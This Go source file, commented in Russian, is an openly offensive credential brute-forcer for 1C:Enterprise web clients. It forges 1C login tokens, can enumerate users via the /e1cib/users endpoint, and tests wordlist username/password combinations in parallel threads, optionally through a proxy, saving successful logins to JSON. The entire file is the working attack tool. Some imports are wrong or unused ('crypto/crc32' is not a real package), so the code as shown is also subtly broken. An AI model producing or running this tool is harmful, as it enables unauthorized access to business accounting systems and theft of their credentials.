package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/crc32"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// FIXED_IV используется для AES-CBC (для совместимости с 1С)
var FIXED_IV = []byte{157, 123, 154, 32, 105, 101, 187, 40, 6, 122, 72, 61, 178, 108, 113, 142}

// CredentialResult хранит результат проверки учетных данных.
type CredentialResult struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
}

// Config для загрузки из конфигурационного файла JSON.
type Config struct {
	URL     string  `json:"url"`
	Timeout float64 `json:"timeout"`
	Threads int     `json:"threads"`
	Proxy   string  `json:"proxy"`
	DryRun  bool    `json:"dry_run"`
}

// pad выполняет PKCS#7 padding.
func pad(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(src, padtext...)
}

// encryptAESCBC шифрует данные в режиме AES-CBC с PKCS#7 padding.
func encryptAESCBC(key, plaintext, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	plaintext = pad(plaintext, block.BlockSize())
	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, plaintext)
	return ciphertext, nil
}

// sha1Base64 вычисляет SHA1-хеш строки и возвращает его base64-кодировку.
func sha1Base64(s string) string {
	h := sha1.Sum([]byte(s))
	return base64.StdEncoding.EncodeToString(h[:])
}

// generateAuthToken генерирует токен аутентификации по алгоритму 1С.
func generateAuthToken(password, username string) (string, error) {
	var tokenBytes bytes.Buffer

	// Версия токена: 1
	tokenBytes.WriteByte(1)

	// Первый блок шифрования
	randomBlock1 := make([]byte, 32)
	if _, err := rand.Read(randomBlock1); err != nil {
		return "", err
	}
	key1Data := []byte(sha1Base64(password))
	key1 := sha256.Sum256(key1Data)
	encryptedBlock1, err := encryptAESCBC(key1[:], randomBlock1, FIXED_IV)
	if err != nil {
		return "", err
	}
	// Записываем длину зашифрованного блока (1 байт) и сам блок
	tokenBytes.WriteByte(byte(len(encryptedBlock1)))
	tokenBytes.Write(encryptedBlock1)

	// Второй блок шифрования с password в верхнем регистре
	randomBlock2 := make([]byte, 32)
	if _, err := rand.Read(randomBlock2); err != nil {
		return "", err
	}
	key2Data := []byte(sha1Base64(strings.ToUpper(password)))
	key2 := sha256.Sum256(key2Data)
	encryptedBlock2, err := encryptAESCBC(key2[:], randomBlock2, FIXED_IV)
	if err != nil {
		return "", err
	}
	tokenBytes.WriteByte(byte(len(encryptedBlock2)))
	tokenBytes.Write(encryptedBlock2)

	// Добавление имени пользователя: 4 байта длины (little-endian) + имя
	usernameBytes := []byte(username)
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(usernameBytes)))
	tokenBytes.Write(lenBuf)
	tokenBytes.Write(usernameBytes)

	// Вычисление CRC32 для всех ранее записанных байт и добавление (4 байта, little-endian)
	crc := crc32.ChecksumIEEE(tokenBytes.Bytes())
	crcBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(crcBuf, crc)
	tokenBytes.Write(crcBuf)

	// Возвращаем base64-кодированное значение
	return base64.StdEncoding.EncodeToString(tokenBytes.Bytes()), nil
}

// createHTTPClient создает HTTP-клиент с таймаутом и опциональным прокси.
func createHTTPClient(timeout time.Duration, proxyURL string) *http.Client {
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout: timeout,
		}).DialContext,
	}
	if proxyURL != "" {
		proxyParsed, err := url.Parse(proxyURL)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyParsed)
		} else {
			log.Printf("Ошибка парсинга прокси: %v", err)
		}
	}
	return &http.Client{
		Transport: transport,
		Timeout:   timeout,
	}
}

// getVersion делает GET-запрос к URL и извлекает версию по регулярному выражению.
func getVersion(client *http.Client, baseURL string) (string, error) {
	resp, err := client.Get(baseURL + "/")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	// Регулярное выражение для поиска версии: var VERSION = "1.2.3"
	re := regexp.MustCompile(`var VERSION = "([0-9\.]+)"`)
	matches := re.FindStringSubmatch(string(bodyBytes))
	if len(matches) >= 2 {
		return matches[1], nil
	}
	return "", fmt.Errorf("не удалось извлечь версию")
}

// authenticate посылает POST-запрос с JSON-данными для аутентификации.
func authenticate(client *http.Client, baseURL, version, credentials string) (bool, error) {
	postURL := fmt.Sprintf("%s/e1cib/login?version=%s", baseURL, version)
	payload := map[string]string{
		"cred": credentials,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return false, err
	}
	req, err := http.NewRequest("POST", postURL, bytes.NewReader(jsonData))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK, nil
}

// fetchUsers получает список пользователей с сервера.
func fetchUsers(client *http.Client, baseURL string) ([]string, error) {
	resp, err := client.Get(baseURL + "/e1cib/users")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	// Предполагается, что пользователи разделены \r\n
	users := strings.Split(string(bodyBytes), "\r\n")
	var trimmed []string
	for _, u := range users {
		u = strings.TrimSpace(u)
		if u != "" {
			trimmed = append(trimmed, u)
		}
	}
	return trimmed, nil
}

// checkCredentials генерирует токен и проверяет учетные данные.
func checkCredentials(client *http.Client, baseURL, version, username, password string, dryRun bool) CredentialResult {
	result := CredentialResult{Username: username, Password: password, Success: false}
	if dryRun {
		log.Printf("Dry-run: проверка %s:%s", username, password)
		return result
	}
	token, err := generateAuthToken(password, username)
	if err != nil {
		log.Printf("Ошибка генерации токена для %s: %v", username, err)
		return result
	}
	ok, err := authenticate(client, baseURL, version, token)
	if err != nil {
		log.Printf("Ошибка аутентификации для %s: %v", username, err)
		return result
	}
	if ok {
		log.Printf("[+] Успешная аутентификация! Пользователь: %s, Пароль: %s", username, password)
		result.Success = true
	}
	return result
}

// loadLinesFromFile загружает строки из файла.
func loadLinesFromFile(filename string) ([]string, error) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	lines := strings.Split(string(data), "\n")
	var trimmed []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			trimmed = append(trimmed, line)
		}
	}
	return trimmed, nil
}

// loadConfig загружает конфигурацию из JSON файла.
func loadConfig(filename string) (Config, error) {
	var cfg Config
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return cfg, err
	}
	err = json.Unmarshal(data, &cfg)
	return cfg, err
}

// runTests выполняет базовые тесты функций.
func runTests() {
	fmt.Println("Запуск тестов...")
	token, err := generateAuthToken("password123", "testuser")
	if err != nil {
		fmt.Printf("Ошибка генерации токена: %v\n", err)
	} else {
		fmt.Println("Сгенерированный токен:", token)
	}
	// Dry-run тест для проверки checkCredentials (без реальных HTTP-запросов)
	dummyResult := checkCredentials(&http.Client{Timeout: 5 * time.Second}, "http://dummy", "1.0", "testuser", "password123", true)
	fmt.Printf("Результат dry-run проверки: %+v\n", dummyResult)
	fmt.Println("Тесты завершены.")
}

func main() {
	// Определение флагов командной строки
	urlFlag := flag.String("url", "", "URL 1С информационной базы")
	userFlag := flag.String("u", "", "Имя пользователя для проверки пароля")
	usersFileFlag := flag.String("U", "", "Файл со списком пользователей")
	passwordFlag := flag.String("p", "", "Пароль для перебора")
	passwordsFileFlag := flag.String("P", "", "Файл со списком паролей")
	getUsersFlag := flag.Bool("l", false, "Получить список пользователей из информационной базы")
	outputFlag := flag.String("o", "", "Файл для сохранения результатов (JSON)")
	configFlag := flag.String("c", "", "Конфигурационный файл (JSON)")
	timeoutFlag := flag.Float64("timeout", 5.0, "Таймаут HTTP-запросов (сек)")
	threadsFlag := flag.Int("threads", 4, "Количество потоков для параллельной проверки")
	proxyFlag := flag.String("proxy", "", "Прокси-сервер (например, http://127.0.0.1:8080)")
	dryRunFlag := flag.Bool("dry-run", false, "Только вывод проверяемых комбинаций (без запросов)")
	runTestsFlag := flag.Bool("run-tests", false, "Запустить тесты функций")
	flag.Parse()

	// Если включен режим тестирования, запускаем тесты и выходим.
	if *runTestsFlag {
		runTests()
		os.Exit(0)
	}

	// Если конфигурационный файл указан, загружаем его и переопределяем параметры.
	var cfg Config
	if *configFlag != "" {
		var err error
		cfg, err = loadConfig(*configFlag)
		if err != nil {
			log.Printf("Ошибка загрузки конфигурационного файла: %v", err)
		}
	}

	// Приоритет: командная строка > конфигурационный файл
	baseURL := *urlFlag
	if baseURL == "" {
		baseURL = cfg.URL
	}
	if baseURL == "" || !strings.HasPrefix(baseURL, "http") {
		log.Fatalf("Некорректный URL: %s", baseURL)
	}

	timeout := time.Duration(*timeoutFlag * float64(time.Second))
	if cfg.Timeout > 0 {
		timeout = time.Duration(cfg.Timeout * float64(time.Second))
	}
	threads := *threadsFlag
	if cfg.Threads > 0 {
		threads = cfg.Threads
	}
	proxy := *proxyFlag
	if proxy == "" {
		proxy = cfg.Proxy
	}
	dryRun := *dryRunFlag || cfg.DryRun

	// Создаем HTTP-клиент с заданным таймаутом и прокси (если указан)
	client := createHTTPClient(timeout, proxy)

	// Получаем версию информационной базы
	version, err := getVersion(client, baseURL)
	if err != nil || version == "" {
		log.Fatalf("Не удалось определить версию! URL: %s, ошибка: %v", baseURL, err)
	}
	log.Printf("Версия: %s", version)

	// Загружаем пользователей
	var users []string
	if *userFlag != "" {
		users = append(users, *userFlag)
	}
	if *usersFileFlag != "" {
		lines, err := loadLinesFromFile(*usersFileFlag)
		if err != nil {
			log.Printf("Ошибка чтения файла с пользователями: %v", err)
		} else {
			users = append(users, lines...)
		}
	}
	if *getUsersFlag {
		fetched, err := fetchUsers(client, baseURL)
		if err != nil {
			log.Printf("Ошибка получения пользователей: %v", err)
		} else {
			users = append(users, fetched...)
		}
	}
	// Убираем дубликаты
	usersMap := make(map[string]bool)
	for _, u := range users {
		usersMap[u] = true
	}
	users = []string{}
	for u := range usersMap {
		users = append(users, u)
	}
	if len(users) == 0 {
		log.Fatalf("Пользователи не загружены!")
	}

	// Загружаем пароли
	var passwords []string
	if *passwordFlag != "" {
		passwords = append(passwords, *passwordFlag)
	}
	if *passwordsFileFlag != "" {
		lines, err := loadLinesFromFile(*passwordsFileFlag)
		if err != nil {
			log.Printf("Ошибка чтения файла с паролями: %v", err)
		} else {
			passwords = append(passwords, lines...)
		}
	}
	if len(passwords) == 0 {
		log.Fatalf("Пароли не загружены!")
	}

	// Формируем список комбинаций для проверки
	type combo struct {
		Username string
		Password string
	}
	var combos []combo
	for _, u := range users {
		for _, p := range passwords {
			combos = append(combos, combo{Username: u, Password: p})
		}
	}
	log.Printf("Начало проверки %d комбинаций с использованием %d потоков...", len(combos), threads)

	// Параллельная проверка с использованием пула горутин
	results := make(chan CredentialResult, len(combos))
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads) // семафор для ограничения числа горутин

	for _, c := range combos {
		wg.Add(1)
		sem <- struct{}{}
		go func(username, password string) {
			defer wg.Done()
			res := checkCredentials(client, baseURL, version, username, password, dryRun)
			results <- res
			<-sem
		}(c.Username, c.Password)
	}

	wg.Wait()
	close(results)

	var successful []CredentialResult
	for r := range results {
		if r.Success {
			successful = append(successful, r)
		}
	}
	log.Printf("Проверка завершена. Успешных попыток: %d", len(successful))

	// Если указан файл для сохранения результатов, сохраняем их в формате JSON.
	if *outputFlag != "" && len(successful) > 0 {
		data, err := json.MarshalIndent(successful, "", "  ")
		if err != nil {
			log.Printf("Ошибка маршалинга результатов: %v", err)
		} else {
			err = ioutil.WriteFile(*outputFlag, data, 0644)
			if err != nil {
				log.Printf("Ошибка сохранения результатов: %v", err)
			} else {
				log.Printf("Результаты сохранены в %s", *outputFlag)
			}
		}
	}
}